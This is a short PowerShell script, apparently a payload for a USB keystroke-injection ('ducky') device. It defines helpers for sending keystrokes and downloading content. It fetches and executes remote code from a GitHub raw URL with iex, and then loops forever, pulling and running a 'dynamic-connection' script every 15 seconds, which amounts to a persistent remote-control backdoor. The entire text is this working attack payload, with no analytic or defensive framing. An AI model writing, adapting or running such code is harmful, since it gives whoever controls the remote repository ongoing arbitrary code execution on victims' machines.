[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::Tls12
function k([string]$a){(new-object -comobject wscript.shell).sendkeys($a)}
function ds([string]$a){(new-object net.webclient).downloadstring($a)}
function df([string]$a,[string]$b){(new-object net.webclient).downloadfile($a, $b)}
function signature{notepad;sleep 1;iex (ds http://raw.githubusercontent.com/computer-geek64/ducky/master/powershell_signatures/kali_powershell)}
while($true){iex (ds "http://raw.githubusercontent.com/computer-geek64/ducky/master/dynamic-connection");sleep 15}
